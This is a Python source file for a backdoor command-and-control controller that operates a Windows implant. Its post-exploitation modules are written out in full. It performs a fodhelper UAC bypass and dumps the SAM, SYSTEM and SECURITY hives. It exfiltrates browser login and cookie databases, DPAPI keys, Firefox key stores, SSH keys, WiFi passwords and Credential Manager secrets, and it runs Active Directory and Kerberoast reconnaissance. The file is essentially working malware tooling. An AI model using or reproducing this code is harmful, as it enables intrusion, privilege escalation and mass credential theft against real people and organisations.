#!/usr/bin/env python3
"""Backdoor C2 controller — interactive REPL, automated test, and post-exploit modes.

TLV protocol: 4-byte cmd_id (little-endian uint32) + 4-byte payload_len + payload.
"""
import asyncio
import struct
import sys
import argparse
import datetime
import os
import json

CMD_HEARTBEAT = 0x01
CMD_SYSINFO = 0x02
CMD_PROCESSES = 0x03
CMD_FILELIST = 0x04
CMD_FILEREAD = 0x05
CMD_FILEWRITE = 0x06
CMD_SCREENSHOT = 0x07
CMD_REGISTRY = 0x08
CMD_NETINFO = 0x09
CMD_EXEC = 0x0A
CMD_EXEC_PS = 0x0B
CMD_EXIT = 0x0D
CMD_NOOP = 0xFF

CMD_NAMES = {
    CMD_HEARTBEAT: "HEARTBEAT",
    CMD_SYSINFO: "SYSINFO",
    CMD_PROCESSES: "PROCESSES",
    CMD_FILELIST: "FILELIST",
    CMD_FILEREAD: "FILEREAD",
    CMD_FILEWRITE: "FILEWRITE",
    CMD_SCREENSHOT: "SCREENSHOT",
    CMD_REGISTRY: "REGISTRY",
    CMD_NETINFO: "NETINFO",
    CMD_EXEC: "EXEC",
    CMD_EXEC_PS: "EXEC_PS",
    CMD_EXIT: "EXIT",
    CMD_NOOP: "NOOP",
}

REPL_CMD_MAP = {
    "sysinfo": (CMD_SYSINFO, b""),
    "ps": (CMD_PROCESSES, b""),
    "processes": (CMD_PROCESSES, b""),
    "screenshot": (CMD_SCREENSHOT, b""),
    "netinfo": (CMD_NETINFO, b""),
    "exit": (CMD_EXIT, b""),
    "quit": (CMD_EXIT, b""),
    "heartbeat": (CMD_HEARTBEAT, b""),
}

HDR_FMT = "<II"
HDR_SIZE = struct.calcsize(HDR_FMT)


def ts():
    return datetime.datetime.now().strftime("%H:%M:%S")


async def recv_tlv(reader):
    hdr_data = await asyncio.wait_for(reader.readexactly(HDR_SIZE), timeout=120)
    cmd_id, payload_len = struct.unpack(HDR_FMT, hdr_data)
    payload = b""
    if payload_len > 0:
        payload = await asyncio.wait_for(reader.readexactly(payload_len), timeout=30)
    return cmd_id, payload


def send_tlv(writer, cmd_id, payload=b""):
    if isinstance(payload, str):
        payload = payload.encode("utf-8", errors="replace")
    hdr = struct.pack(HDR_FMT, cmd_id, len(payload))
    writer.write(hdr + payload)


async def run_test_sequence(reader, writer, logfile):
    results = []

    def log(msg):
        line = f"[{ts()}] {msg}"
        print(line, flush=True)
        if logfile:
            logfile.write(line + "\n")
            logfile.flush()

    log("TEST: waiting for heartbeat...")
    try:
        cmd_id, payload = await asyncio.wait_for(recv_tlv(reader), timeout=60)
        if cmd_id == CMD_HEARTBEAT:
            log(f"TEST: heartbeat received ({len(payload)} bytes)")
            results.append(("heartbeat", True))
        else:
            log(f"TEST: expected heartbeat, got cmd_id=0x{cmd_id:02x}")
            results.append(("heartbeat", False))
    except (asyncio.TimeoutError, asyncio.IncompleteReadError) as e:
        log(f"TEST: heartbeat timeout: {e}")
        results.append(("heartbeat", False))

    for test_name, cmd_id, args, check_fn in [
        ("sysinfo", CMD_SYSINFO, b"", lambda d: len(d) > 5),
        ("processes", CMD_PROCESSES, b"", lambda d: b"explorer" in d.lower() or b"system" in d.lower() or len(d) > 20),
        ("filelist", CMD_FILELIST, b"C:\\Users", lambda d: len(d) > 5),
    ]:
        log(f"TEST: sending {test_name}...")
        try:
            send_tlv(writer, cmd_id, args)
            await writer.drain()
            resp_id, resp_data = await asyncio.wait_for(recv_tlv(reader), timeout=30)
            if resp_data.startswith(b"ERR:"):
                log(f"TEST: {test_name} returned error: {resp_data.decode(errors='replace')}")
                results.append((test_name, False))
            elif check_fn(resp_data):
                preview = resp_data[:200].decode("utf-8", errors="replace")
                log(f"TEST: {test_name} OK ({len(resp_data)} bytes): {preview[:100]}")
                results.append((test_name, True))
            else:
                log(f"TEST: {test_name} check failed ({len(resp_data)} bytes)")
                results.append((test_name, False))
        except (asyncio.TimeoutError, asyncio.IncompleteReadError) as e:
            log(f"TEST: {test_name} failed: {e}")
            results.append((test_name, False))

    log("TEST: sending exit...")
    try:
        send_tlv(writer, CMD_EXIT, b"")
        await writer.drain()
        resp_id, resp_data = await asyncio.wait_for(recv_tlv(reader), timeout=10)
        log(f"TEST: exit response: {resp_data.decode(errors='replace')}")
        results.append(("exit", True))
    except Exception:
        results.append(("exit", True))

    passed = sum(1 for _, ok in results if ok)
    total = len(results)
    log(f"\n{'='*40}")
    for name, ok in results:
        log(f"  {name}: {'PASS' if ok else 'FAIL'}")
    log(f"{'='*40}")

    if passed >= 4:
        log(f"TEST PASS ({passed}/{total})")
        return 0
    else:
        log(f"TEST FAIL ({passed}/{total})")
        return 1


async def run_interactive(reader, writer, logfile):
    def log(msg):
        line = f"[{ts()}] {msg}"
        print(line, flush=True)
        if logfile:
            logfile.write(line + "\n")
            logfile.flush()

    results_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "results")
    latest = os.path.join(results_dir, "latest")
    if os.path.islink(latest) or os.path.isdir(latest):
        run_dir = os.path.realpath(latest)
    else:
        run_dir = results_dir
    repl_loot = os.path.join(run_dir, f"loot_{datetime.datetime.now():%Y%m%d_%H%M%S}")

    log("Interactive mode — waiting for heartbeat...")
    try:
        cmd_id, payload = await asyncio.wait_for(recv_tlv(reader), timeout=60)
        log(f"Heartbeat received (cmd=0x{cmd_id:02x}, {len(payload)} bytes)")
    except Exception as e:
        log(f"No heartbeat: {e}")
        return 1

    loop = asyncio.get_event_loop()
    while True:
        try:
            line = await loop.run_in_executor(None, lambda: input("c2> "))
        except (EOFError, KeyboardInterrupt):
            break

        line = line.strip()
        if not line:
            continue

        parts = line.split(None, 1)
        cmd_word = parts[0].lower()
        args_str = parts[1] if len(parts) > 1 else ""

        if cmd_word in REPL_CMD_MAP:
            cmd_id, default_args = REPL_CMD_MAP[cmd_word]
            payload = args_str.encode() if args_str else default_args
        elif cmd_word == "ls":
            cmd_id = CMD_FILELIST
            payload = args_str.encode() if args_str else b"C:\\"
        elif cmd_word == "get":
            cmd_id = CMD_FILEREAD
            payload = args_str.encode()
        elif cmd_word == "put":
            file_parts = args_str.split(None, 1)
            if len(file_parts) < 2:
                print("Usage: put <path> <content>")
                continue
            cmd_id = CMD_FILEWRITE
            payload = args_str.encode()
        elif cmd_word == "reg":
            cmd_id = CMD_REGISTRY
            payload = args_str.encode() if args_str else b"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
        elif cmd_word == "exec":
            cmd_id = CMD_EXEC
            payload = args_str.encode()
        elif cmd_word == "psh":
            cmd_id = CMD_EXEC_PS
            payload = args_str.encode()
        elif cmd_word == "privesc":
            os.makedirs(repl_loot, exist_ok=True)
            log("Running privilege escalation + UAC bypass attempts...")
            r = await postexploit_privesc(reader, writer, log, loot_dir=repl_loot)
            log(f"privesc complete — {len(r)} items")
            continue
        elif cmd_word == "creds":
            os.makedirs(repl_loot, exist_ok=True)
            log("Running credential harvesting + exfiltration...")
            r = await postexploit_creds(reader, writer, log, loot_dir=repl_loot)
            log(f"creds complete — {len(r)} items")
            continue
        elif cmd_word == "adrecon":
            os.makedirs(repl_loot, exist_ok=True)
            log("Running AD recon + Kerberoast...")
            r = await postexploit_adrecon(reader, writer, log, loot_dir=repl_loot)
            log(f"adrecon complete — {len(r)} items")
            continue
        elif cmd_word == "steal":
            os.makedirs(repl_loot, exist_ok=True)
            log("Running file search + exfiltration...")
            r = await postexploit_steal(reader, writer, log, loot_dir=repl_loot)
            log(f"steal complete — {len(r)} items")
            continue
        elif cmd_word == "persist":
            log("Running persistence enumeration...")
            r = await postexploit_persist(reader, writer, log, loot_dir=repl_loot)
            log(f"persist complete — {len(r)} items")
            continue
        elif cmd_word == "network":
            os.makedirs(repl_loot, exist_ok=True)
            log("Running network recon...")
            r = await postexploit_network(reader, writer, log, loot_dir=repl_loot)
            log(f"network complete — {len(r)} items")
            continue
        elif cmd_word == "postexploit":
            os.makedirs(repl_loot, exist_ok=True)
            mods = args_str.split(",") if args_str else None
            log("Running full post-exploit sequence...")
            await run_post_exploit(reader, writer, logfile, mods, loot_dir=repl_loot)
            continue
        elif cmd_word == "help":
            print("Commands:")
            print("  Base:       sysinfo, ps, ls [dir], get <file>, put <path> <content>")
            print("              screenshot, reg [key], netinfo, exec <cmd>, psh <cmd>")
            print("              heartbeat, exit")
            print("  Post-exploit (all save loot to results/):")
            print("    privesc     — UAC bypass + SAM/SYSTEM dump + priv recon")
            print("    creds       — exfil browser DBs, DPAPI, SSH keys, WiFi, cmdkey")
            print("    adrecon     — AD users/groups/SPNs + Kerberoast TGS tickets + LAPS")
            print("    steal       — find + exfiltrate sensitive files (docs, keys, KeePass)")
            print("    persist     — enumerate persistence mechanisms (Run keys, tasks, WMI)")
            print("    network     — connections, ARP, routes, listeners, firewall rules")
            print("    postexploit [mod1,mod2,...] — run all (or specified) modules")
            continue
        else:
            print(f"Unknown command: {cmd_word}. Type 'help' for commands.")
            continue

        send_tlv(writer, cmd_id, payload)
        await writer.drain()
        log(f"Sent {CMD_NAMES.get(cmd_id, f'0x{cmd_id:02x}')} ({len(payload)} bytes)")

        if cmd_id == CMD_EXIT:
            log("Exit sent, closing.")
            break

        try:
            resp_id, resp_data = await asyncio.wait_for(recv_tlv(reader), timeout=30)
            name = CMD_NAMES.get(resp_id, f"0x{resp_id:02x}")
            if resp_id == CMD_SCREENSHOT:
                fname = f"screenshot_{datetime.datetime.now():%Y%m%d_%H%M%S}.bmp"
                with open(fname, "wb") as f:
                    f.write(resp_data)
                log(f"Response [{name}]: {len(resp_data)} bytes saved to {fname}")
            else:
                text = resp_data.decode("utf-8", errors="replace")
                log(f"Response [{name}] ({len(resp_data)} bytes):\n{text}")
        except asyncio.TimeoutError:
            log("Response timeout (30s)")
        except asyncio.IncompleteReadError:
            log("Connection closed by implant")
            break

    return 0


# ---------------------------------------------------------------------------
# Post-exploit helpers
# ---------------------------------------------------------------------------

async def _exec(reader, writer, cmd, timeout=30):
    """Send CMD_EXEC and return response text."""
    send_tlv(writer, CMD_EXEC, cmd.encode())
    await writer.drain()
    _, data = await asyncio.wait_for(recv_tlv(reader), timeout=timeout)
    return data.decode("utf-8", errors="replace").strip()


async def _psh(reader, writer, cmd, timeout=60):
    """Send CMD_EXEC_PS and return response text."""
    send_tlv(writer, CMD_EXEC_PS, cmd.encode())
    await writer.drain()
    _, data = await asyncio.wait_for(recv_tlv(reader), timeout=timeout)
    return data.decode("utf-8", errors="replace").strip()


async def _reg(reader, writer, key, timeout=15):
    """Send CMD_REGISTRY and return response text."""
    send_tlv(writer, CMD_REGISTRY, key.encode())
    await writer.drain()
    _, data = await asyncio.wait_for(recv_tlv(reader), timeout=timeout)
    return data.decode("utf-8", errors="replace").strip()


async def _fileread(reader, writer, path, timeout=30):
    """Send CMD_FILEREAD and return raw bytes."""
    send_tlv(writer, CMD_FILEREAD, path.encode())
    await writer.drain()
    _, data = await asyncio.wait_for(recv_tlv(reader), timeout=timeout)
    return data


def _section(title):
    w = 60
    return f"\n{'='*w}\n  {title}\n{'='*w}"


def _save_loot(loot_dir, subdir, filename, data, log):
    """Save exfiltrated data to loot directory. Returns path or None."""
    if not data or (isinstance(data, bytes) and data.startswith(b"ERR:")):
        return None
    d = os.path.join(loot_dir, subdir)
    os.makedirs(d, exist_ok=True)
    path = os.path.join(d, filename)
    mode = "wb" if isinstance(data, bytes) else "w"
    with open(path, mode) as f:
        f.write(data)
    size = len(data)
    log(f"    -> saved {path} ({size} bytes)")
    return path


def _parse_file_listing(psh_output):
    """Extract file paths from PowerShell Get-ChildItem Format-Table output."""
    paths = []
    for line in psh_output.splitlines():
        line = line.strip()
        if not line or line.startswith("FullName") or line.startswith("---"):
            continue
        parts = line.split()
        if parts:
            candidate = parts[0]
            if ":\\" in candidate:
                paths.append(candidate)
    return paths


# ---------------------------------------------------------------------------
# Post-exploit modules
# ---------------------------------------------------------------------------

MAX_EXFIL_FILE_SIZE = 10 * 1024 * 1024  # 10MB per file limit

async def postexploit_privesc(reader, writer, log, loot_dir=None):
    """Privilege escalation — recon then attempt."""
    log(_section("PRIVILEGE ESCALATION"))
    results = {}

    log("[privesc] checking current user + privileges...")
    results["whoami"] = await _exec(reader, writer, "whoami /all")
    user_line = results["whoami"].splitlines()[0] if results["whoami"] else "unknown"
    log(f"  user: {user_line}")

    is_admin = await _psh(reader, writer,
        '([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())'
        '.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)')
    results["is_admin"] = is_admin.strip()
    if "true" in is_admin.lower():
        log("  [+] ALREADY ADMIN — skipping escalation attempts")
        results["escalation"] = "already_admin"
        if loot_dir:
            log("[privesc] dumping SAM hashes (admin)...")
            sam = await _psh(reader, writer,
                'reg save HKLM\\SAM C:\\Windows\\Temp\\s.dat /y >$null 2>&1; '
                'reg save HKLM\\SYSTEM C:\\Windows\\Temp\\y.dat /y >$null 2>&1; '
                '"SAM+SYSTEM saved"', timeout=15)
            results["sam_dump"] = sam
            for fname in ["s.dat", "y.dat"]:
                try:
                    data = await _fileread(reader, writer, f"C:\\Windows\\Temp\\{fname}", timeout=15)
                    if data and not data.startswith(b"ERR:"):
                        lbl = "SAM" if fname == "s.dat" else "SYSTEM"
                        _save_loot(loot_dir, "privesc", f"{lbl}.dat", data, log)
                except Exception:
                    pass
            await _exec(reader, writer, "del /f C:\\Windows\\Temp\\s.dat C:\\Windows\\Temp\\y.dat 2>nul")

            log("[privesc] dumping LSA secrets registry...")
            lsa = await _psh(reader, writer,
                'reg save HKLM\\SECURITY C:\\Windows\\Temp\\sec.dat /y >$null 2>&1; "SECURITY saved"',
                timeout=15)
            try:
                data = await _fileread(reader, writer, "C:\\Windows\\Temp\\sec.dat", timeout=15)
                if data and not data.startswith(b"ERR:"):
                    _save_loot(loot_dir, "privesc", "SECURITY.dat", data, log)
            except Exception:
                pass
            await _exec(reader, writer, "del /f C:\\Windows\\Temp\\sec.dat 2>nul")

        return results

    log("[privesc] checking token privileges...")
    results["privs"] = await _exec(reader, writer, "whoami /priv")
    interesting = []
    for priv in ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
                 "SeBackupPrivilege", "SeRestorePrivilege", "SeDebugPrivilege",
                 "SeTakeOwnershipPrivilege", "SeLoadDriverPrivilege"]:
        if priv in results["privs"]:
            interesting.append(priv)
    if interesting:
        log(f"  [!] interesting privs: {', '.join(interesting)}")

    log("[privesc] checking local group memberships...")
    results["groups"] = await _exec(reader, writer, "whoami /groups")

    log("[privesc] checking admin group members...")
    results["admin_check"] = await _exec(reader, writer, "net localgroup administrators")

    log("[privesc] checking UAC level...")
    results["uac"] = await _reg(reader, writer,
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")

    uac_text = results["uac"]
    consent_prompt = "1"
    enable_lua = "1"
    for line in uac_text.splitlines():
        if "ConsentPromptBehaviorAdmin" in line:
            for part in line.split():
                if part.isdigit():
                    consent_prompt = part
        if "EnableLUA" in line:
            for part in line.split():
                if part.isdigit():
                    enable_lua = part

    # --- UAC bypass attempts ---
    log("[privesc] attempting UAC bypass via fodhelper...")
    fodhelper_result = await _psh(reader, writer,
        'New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force | Out-Null; '
        'Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" '
        '-Name "(Default)" -Value "cmd.exe /c whoami > C:\\Windows\\Temp\\uac_test.txt" -Force; '
        'Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" '
        '-Name "DelegateExecute" -Value "" -Force; '
        'Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden; '
        'Start-Sleep -Seconds 3; '
        'if(Test-Path "C:\\Windows\\Temp\\uac_test.txt") { '
        '  $r = Get-Content "C:\\Windows\\Temp\\uac_test.txt"; '
        '  Remove-Item "C:\\Windows\\Temp\\uac_test.txt" -Force; '
        '  "ELEVATED: $r" '
        '} else { "FAILED" }; '
        'Remove-Item "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue',
        timeout=20)
    results["uac_fodhelper"] = fodhelper_result
    if "ELEVATED" in fodhelper_result:
        log(f"  [!] UAC BYPASS SUCCESS (fodhelper): {fodhelper_result.strip()}")
        results["escalation"] = "fodhelper_success"

        log("[privesc] running elevated payload via fodhelper...")
        await _psh(reader, writer,
            'New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force | Out-Null; '
            'Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" '
            '-Name "(Default)" -Value "cmd.exe /c reg save HKLM\\SAM C:\\Windows\\Temp\\s.dat /y && '
            'reg save HKLM\\SYSTEM C:\\Windows\\Temp\\y.dat /y && '
            'reg save HKLM\\SECURITY C:\\Windows\\Temp\\sec.dat /y" -Force; '
            'Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" '
            '-Name "DelegateExecute" -Value "" -Force; '
            'Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden; '
            'Start-Sleep -Seconds 5; '
            'Remove-Item "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue; '
            '"done"',
            timeout=20)

        if loot_dir:
            for fname, lbl in [("s.dat", "SAM"), ("y.dat", "SYSTEM"), ("sec.dat", "SECURITY")]:
                try:
                    data = await _fileread(reader, writer, f"C:\\Windows\\Temp\\{fname}", timeout=15)
                    if data and not data.startswith(b"ERR:"):
                        _save_loot(loot_dir, "privesc", f"{lbl}.dat", data, log)
                except Exception:
                    pass
            await _exec(reader, writer,
                "del /f C:\\Windows\\Temp\\s.dat C:\\Windows\\Temp\\y.dat C:\\Windows\\Temp\\sec.dat 2>nul")
    else:
        log("  fodhelper bypass failed")

        log("[privesc] attempting UAC bypass via eventvwr (computerdefaults)...")
        eventvwr_result = await _psh(reader, writer,
            'New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force | Out-Null; '
            'Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" '
            '-Name "(Default)" -Value "cmd.exe /c whoami > C:\\Windows\\Temp\\uac_test2.txt" -Force; '
            'Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" '
            '-Name "DelegateExecute" -Value "" -Force; '
            'Start-Process "C:\\Windows\\System32\\ComputerDefaults.exe" -WindowStyle Hidden; '
            'Start-Sleep -Seconds 3; '
            'if(Test-Path "C:\\Windows\\Temp\\uac_test2.txt") { '
            '  $r = Get-Content "C:\\Windows\\Temp\\uac_test2.txt"; '
            '  Remove-Item "C:\\Windows\\Temp\\uac_test2.txt" -Force; '
            '  "ELEVATED: $r" '
            '} else { "FAILED" }; '
            'Remove-Item "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue',
            timeout=20)
        results["uac_computerdefaults"] = eventvwr_result
        if "ELEVATED" in eventvwr_result:
            log(f"  [!] UAC BYPASS SUCCESS (computerdefaults): {eventvwr_result.strip()}")
            results["escalation"] = "computerdefaults_success"
        else:
            log("  computerdefaults bypass failed")

    log("[privesc] checking unquoted service paths...")
    results["services"] = await _psh(reader, writer,
        'Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike \'*"*\' -and $_.PathName -like \'* *\'} '
        '| Select-Object Name,PathName,StartMode | Format-Table -AutoSize | Out-String')
    if results["services"] and "Name" in results["services"]:
        log(f"  [!] unquoted service paths found")

    log("[privesc] checking writable PATH dirs...")
    results["path_hijack"] = await _psh(reader, writer,
        '$env:PATH.Split(";") | ForEach-Object { if($_ -and (Test-Path $_)) '
        '{ $acl = Get-Acl $_; foreach($a in $acl.Access) '
        '{ if($a.FileSystemRights -match "Write|FullControl" -and '
        '$a.IdentityReference -match "Users|Everyone|Authenticated") '
        '{ "$_ -> $($a.IdentityReference): $($a.FileSystemRights)" } } } }')
    if results["path_hijack"]:
        log(f"  [!] writable PATH dirs: {results['path_hijack'][:200]}")

    log("[privesc] checking AlwaysInstallElevated...")
    results["always_elevated"] = await _reg(reader, writer,
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer")

    log("[privesc] checking scheduled tasks with SYSTEM...")
    results["schtasks"] = await _exec(reader, writer,
        'schtasks /query /fo CSV /nh | findstr /i "SYSTEM"')

    log("[privesc] checking auto-logon creds in registry...")
    results["autologon"] = await _reg(reader, writer,
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
    if loot_dir:
        _save_loot(loot_dir, "privesc", "autologon_reg.txt", results["autologon"], log)

    return results


async def postexploit_creds(reader, writer, log, loot_dir=None):
    """Credential harvesting — find and exfiltrate credential stores."""
    log(_section("CREDENTIAL HARVESTING"))
    results = {}

    log("[creds] checking saved credentials (cmdkey)...")
    results["cmdkey"] = await _exec(reader, writer, "cmdkey /list")
    if loot_dir and results["cmdkey"]:
        _save_loot(loot_dir, "creds", "cmdkey.txt", results["cmdkey"], log)

    log("[creds] extracting WiFi profiles + passwords...")
    profiles = await _exec(reader, writer, 'netsh wlan show profiles')
    results["wifi_profiles"] = profiles
    wifi_passwords = []
    if profiles and "All User Profile" in profiles:
        for line in profiles.splitlines():
            if "All User Profile" in line:
                name = line.split(":")[-1].strip()
                if name:
                    pw_out = await _exec(reader, writer,
                        f'netsh wlan show profile name="{name}" key=clear')
                    wifi_passwords.append(f"=== {name} ===\n{pw_out}")
    results["wifi_passwords"] = "\n".join(wifi_passwords) if wifi_passwords else "none"
    if wifi_passwords:
        log(f"  [!] {len(wifi_passwords)} WiFi profiles with passwords recovered")
        if loot_dir:
            _save_loot(loot_dir, "creds", "wifi_passwords.txt",
                       "\n".join(wifi_passwords), log)

    log("[creds] checking saved RDP connections...")
    results["rdp_saved"] = await _reg(reader, writer,
        r"HKCU\Software\Microsoft\Terminal Server Client\Servers")
    if loot_dir and results["rdp_saved"]:
        _save_loot(loot_dir, "creds", "rdp_saved.txt", results["rdp_saved"], log)

    log("[creds] exfiltrating DPAPI master keys...")
    dpapi_list = await _psh(reader, writer,
        'Get-ChildItem "$env:APPDATA\\Microsoft\\Protect" -Recurse -Force '
        '| Where-Object { !$_.PSIsContainer } '
        '| Select-Object FullName | ForEach-Object { $_.FullName }')
    results["dpapi_list"] = dpapi_list
    if loot_dir and dpapi_list:
        dpapi_paths = [p.strip() for p in dpapi_list.splitlines() if p.strip() and ":\\" in p]
        for dp in dpapi_paths[:20]:
            try:
                data = await _fileread(reader, writer, dp, timeout=10)
                if data and not data.startswith(b"ERR:"):
                    fname = os.path.basename(dp)
                    _save_loot(loot_dir, "creds/dpapi", fname, data, log)
            except Exception:
                pass
        log(f"  [!] {len(dpapi_paths)} DPAPI master key files exfiltrated")

    log("[creds] exfiltrating browser credential databases...")
    browser_dbs = [
        ("chrome_login_data", r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
        ("chrome_cookies", r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies"),
        ("chrome_history", r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History"),
        ("chrome_local_state", r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State"),
        ("edge_login_data", r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"),
        ("edge_cookies", r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies"),
        ("edge_local_state", r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State"),
    ]
    for label, template_path in browser_dbs:
        resolved = await _psh(reader, writer,
            f'$p=[Environment]::ExpandEnvironmentVariables("{template_path}"); '
            f'if(Test-Path $p) {{ $p }} else {{ "MISSING" }}')
        resolved = resolved.strip()
        if resolved and resolved != "MISSING" and ":\\" in resolved:
            results[f"browser_{label}"] = "FOUND"
            log(f"  [!] {label}: FOUND")
            if loot_dir:
                copy_path = f"C:\\Windows\\Temp\\{label}.tmp"
                await _psh(reader, writer,
                    f'Copy-Item "{resolved}" "{copy_path}" -Force -ErrorAction SilentlyContinue; "ok"',
                    timeout=10)
                try:
                    data = await _fileread(reader, writer, copy_path, timeout=30)
                    if data and not data.startswith(b"ERR:"):
                        ext = ".sqlite" if "login" in label or "cookie" in label or "history" in label else ".json"
                        _save_loot(loot_dir, "creds/browser", f"{label}{ext}", data, log)
                except Exception as e:
                    log(f"    failed to exfil {label}: {e}")
                await _exec(reader, writer, f'del /f "{copy_path}" 2>nul')
        else:
            results[f"browser_{label}"] = "MISSING"

    log("[creds] exfiltrating Firefox profiles...")
    ff_profiles = await _psh(reader, writer,
        '$d=[Environment]::ExpandEnvironmentVariables("%APPDATA%\\Mozilla\\Firefox\\Profiles"); '
        'if(Test-Path $d) { Get-ChildItem $d -Directory | ForEach-Object { $_.FullName } } else { "MISSING" }')
    if ff_profiles.strip() and ff_profiles.strip() != "MISSING":
        for profile_dir in ff_profiles.strip().splitlines():
            profile_dir = profile_dir.strip()
            if not profile_dir or ":\\" not in profile_dir:
                continue
            pname = os.path.basename(profile_dir)
            for ff_file in ["logins.json", "key4.db", "cert9.db", "cookies.sqlite"]:
                ff_path = f"{profile_dir}\\{ff_file}"
                exists = await _psh(reader, writer,
                    f'if(Test-Path "{ff_path}") {{ "Y" }} else {{ "N" }}')
                if "Y" in exists:
                    if loot_dir:
                        try:
                            data = await _fileread(reader, writer, ff_path, timeout=30)
                            if data and not data.startswith(b"ERR:"):
                                _save_loot(loot_dir, f"creds/firefox/{pname}", ff_file, data, log)
                        except Exception:
                            pass
        results["firefox"] = "EXFILTRATED"
    else:
        results["firefox"] = "MISSING"

    log("[creds] checking Credential Manager via PowerShell...")
    results["credman"] = await _psh(reader, writer,
        '[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];'
        'try { (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() '
        '| ForEach-Object { $_.RetrievePassword(); "$($_.Resource) | $($_.UserName) | $($_.Password)" } } '
        'catch { "PasswordVault: access denied or empty" }',
        timeout=15)
    if loot_dir and results["credman"] and "access denied" not in results["credman"].lower():
        _save_loot(loot_dir, "creds", "credential_manager.txt", results["credman"], log)

    log("[creds] checking environment variables for secrets...")
    results["env_secrets"] = await _psh(reader, writer,
        'Get-ChildItem env: | Where-Object { $_.Name -match "KEY|SECRET|TOKEN|PASS|CRED|API" } '
        '| Format-Table Name,Value -AutoSize | Out-String')
    if loot_dir and results["env_secrets"].strip():
        _save_loot(loot_dir, "creds", "env_secrets.txt", results["env_secrets"], log)

    log("[creds] checking for PuTTY saved sessions...")
    results["putty"] = await _reg(reader, writer,
        r"HKCU\Software\SimonTatham\PuTTY\Sessions")
    if loot_dir and results["putty"] and "ERR:" not in results["putty"]:
        _save_loot(loot_dir, "creds", "putty_sessions.txt", results["putty"], log)

    log("[creds] exfiltrating SSH keys...")
    ssh_files = await _psh(reader, writer,
        '$d="$env:USERPROFILE\\.ssh"; if(Test-Path $d) { '
        'Get-ChildItem $d -Force | ForEach-Object { $_.FullName } } else { "MISSING" }')
    if ssh_files.strip() and ssh_files.strip() != "MISSING":
        for sf in ssh_files.strip().splitlines():
            sf = sf.strip()
            if sf and ":\\" in sf:
                if loot_dir:
                    try:
                        data = await _fileread(reader, writer, sf, timeout=10)
                        if data and not data.startswith(b"ERR:"):
                            _save_loot(loot_dir, "creds/ssh", os.path.basename(sf), data, log)
                    except Exception:
                        pass
        results["ssh_keys"] = "EXFILTRATED"
        log(f"  [!] SSH keys exfiltrated")
    else:
        results["ssh_keys"] = "MISSING"

    return results


async def postexploit_adrecon(reader, writer, log, loot_dir=None):
    """Active Directory reconnaissance."""
    log(_section("AD RECONNAISSANCE"))
    results = {}

    log("[adrecon] checking domain membership...")
    results["domain_check"] = await _psh(reader, writer,
        '(Get-WmiObject Win32_ComputerSystem).Domain + " | PartOfDomain=" + '
        '(Get-WmiObject Win32_ComputerSystem).PartOfDomain')

    is_domain = "true" in results["domain_check"].lower()
    if not is_domain:
        log("  not domain-joined, skipping AD recon")
        results["status"] = "NOT_DOMAIN_JOINED"
        return results

    log("  domain-joined, running AD recon...")

    log("[adrecon] domain controllers...")
    results["dcs"] = await _exec(reader, writer, "nltest /dclist:")

    log("[adrecon] domain trusts...")
    results["trusts"] = await _exec(reader, writer, "nltest /domain_trusts /all_trusts")

    log("[adrecon] domain users (full detail)...")
    results["users"] = await _psh(reader, writer,
        'Get-ADUser -Filter * -Properties SamAccountName,DisplayName,Enabled,LastLogonDate,'
        'PasswordLastSet,PasswordNeverExpires,AdminCount '
        '| Select-Object SamAccountName,DisplayName,Enabled,LastLogonDate,PasswordLastSet,'
        'PasswordNeverExpires,AdminCount '
        '| Format-Table -AutoSize | Out-String -Width 300',
        timeout=30)

    log("[adrecon] domain groups...")
    results["groups"] = await _exec(reader, writer, "net group /domain")

    log("[adrecon] domain admins...")
    results["domain_admins"] = await _exec(reader, writer,
        'net group "Domain Admins" /domain')

    log("[adrecon] enterprise admins...")
    results["enterprise_admins"] = await _exec(reader, writer,
        'net group "Enterprise Admins" /domain')

    log("[adrecon] group policy objects...")
    results["gpos"] = await _psh(reader, writer,
        'Get-GPO -All | Select-Object DisplayName,Id | Format-Table | Out-String',
        timeout=15)

    log("[adrecon] SPNs (Kerberoastable accounts)...")
    results["spns"] = await _psh(reader, writer,
        'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,SamAccountName '
        '| Select-Object SamAccountName,@{N="SPN";E={$_.ServicePrincipalName -join ","}} '
        '| Format-Table -AutoSize | Out-String',
        timeout=15)
